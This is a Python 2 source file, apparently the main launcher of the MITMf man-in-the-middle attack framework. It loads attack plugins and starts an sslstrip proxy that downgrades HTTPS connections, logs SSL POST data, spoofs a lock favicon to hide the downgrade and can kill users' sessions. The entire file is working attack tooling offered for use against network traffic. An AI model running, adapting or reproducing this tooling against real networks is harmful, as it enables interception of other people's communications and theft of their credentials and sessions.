#!/usr/bin/env python

from twisted.web import http
from twisted.internet import reactor

from libs.sslstrip.CookieCleaner import CookieCleaner
from libs.sergioproxy.ProxyPlugins import ProxyPlugins

import sys, logging, traceback, string, os
import argparse

try:
    import user_agents
except:
    sys.exit("[-] user_agents library not installed!")

try:
    from configobj import ConfigObj
except:
    sys.exit("[-] configobj library not installed!")

from plugins import *
plugin_classes = plugin.Plugin.__subclasses__()

mitmf_version = "0.9"
sslstrip_version = "0.9"
sergio_version = "0.2.1"

if __name__ == "__main__":

    parser = argparse.ArgumentParser(description="MITMf v%s - Framework for MITM attacks" % mitmf_version, epilog="Use wisely, young Padawan.",fromfile_prefix_chars='@')
    #add MITMf options
    mgroup = parser.add_argument_group("MITMf", "Options for MITMf")
    mgroup.add_argument("--log-level", type=str,choices=['debug', 'info'], default="info", help="Specify a log level [default: info]")
    mgroup.add_argument("-i", "--interface", type=str,  metavar="interface" ,help="Interface to listen on")
    mgroup.add_argument("-c", "--config-file", dest='configfile', type=str, default="./config/mitmf.cfg", metavar='configfile', help="Specify config file to use")
    mgroup.add_argument('-d', '--disable-proxy', dest='disproxy', action='store_true', default=False, help='Only run plugins, disable all proxies')
    #add sslstrip options
    sgroup = parser.add_argument_group("SSLstrip", "Options for SSLstrip library")
    #sgroup.add_argument("-w", "--write", type=argparse.FileType('w'), metavar="filename", default=sys.stdout, help="Specify file to log to (stdout by default).")
    slogopts = sgroup.add_mutually_exclusive_group()
    slogopts.add_argument("-p", "--post", action="store_true",help="Log only SSL POSTs. (default)")
    slogopts.add_argument("-s", "--ssl", action="store_true", help="Log all SSL traffic to and from server.")
    slogopts.add_argument("-a", "--all", action="store_true", help="Log all SSL and HTTP traffic to and from server.")
    #slogopts.add_argument("-c", "--clients", action='store_true', default=False, help='Log each clients data in a seperate file') #not fully tested yet
    sgroup.add_argument("-l", "--listen", type=int, metavar="port", default=10000, help="Port to listen on (default 10000)")
    sgroup.add_argument("-f", "--favicon", action="store_true", help="Substitute a lock favicon on secure requests.")
    sgroup.add_argument("-k", "--killsessions", action="store_true", help="Kill sessions in progress.")

    #Initialize plugins
    plugins = []
    try:
        for p in plugin_classes:
            plugins.append(p())
    except:
        print "Failed to load plugin class %s" % str(p)

    #Give subgroup to each plugin with options
    try:
        for p in plugins:
            if p.desc == "":
                sgroup = parser.add_argument_group("%s" % p.name,"Options for %s." % p.name)
            else:
                sgroup = parser.add_argument_group("%s" % p.name,p.desc)

            sgroup.add_argument("--%s" % p.optname, action="store_true",help="Load plugin %s" % p.name)
            if p.has_opts:
                p.add_options(sgroup)
    except NotImplementedError:
        print "Plugin %s claimed option support, but didn't have it." % p.name

    args = parser.parse_args()

    try:
        configfile = ConfigObj(args.configfile)
    except Exception, e:
        sys.exit("[-] Error parsing config file: " + str(e))

    config_args = configfile['MITMf']['args']
    if config_args:
        print "[*] Loading arguments from config file"
        for arg in config_args.split(' '):
            sys.argv.append(arg)
        args = parser.parse_args()

    if not args.interface:
        sys.exit("[-] -i , --interface argument is required")

    args.configfile = configfile #so we can pass the configobj down to all the plugins

    log_level = logging.__dict__[args.log_level.upper()]

    #Start logging 
    logging.basicConfig(level=log_level, format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
    logFormatter = logging.Formatter("%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
    rootLogger = logging.getLogger()
    
    fileHandler = logging.FileHandler("./logs/mitmf.log")
    fileHandler.setFormatter(logFormatter)
    rootLogger.addHandler(fileHandler)

    #All our options should be loaded now, pass them onto plugins
    print "[*] MITMf v%s started... initializing plugins and modules" % mitmf_version
    if ('--responder' and '--wpad') in sys.argv:
        args.listen = 3141
        print "[*] SSLstrip is now listening on port 3141 since --wpad was passed"

    load = []
    try:
        for p in plugins:
            if  getattr(args, p.optname):
                p.initialize(args)
                load.append(p)
    except NotImplementedError:
        print "Plugin %s lacked initialize function." % p.name

    #Plugins are ready to go, start MITMf
    if args.disproxy:
        ProxyPlugins.getInstance().setPlugins(load)

    else:
        from libs.sslstrip.StrippingProxy import StrippingProxy
        from libs.sslstrip.URLMonitor import URLMonitor

        URLMonitor.getInstance().setFaviconSpoofing(args.favicon)
        CookieCleaner.getInstance().setEnabled(args.killsessions)
        ProxyPlugins.getInstance().setPlugins(load)

        strippingFactory              = http.HTTPFactory(timeout=10)
        strippingFactory.protocol     = StrippingProxy

        reactor.listenTCP(args.listen, strippingFactory)

        print "\n[*] sslstrip v%s by Moxie Marlinspike running..." % sslstrip_version
        if args.hsts:
            print "[*] sslstrip+ by Leonardo Nve running..."
        print "[*] sergio-proxy v%s online" % sergio_version

    reactor.run()

    #cleanup on exit
    for p in load:
        p.finish()
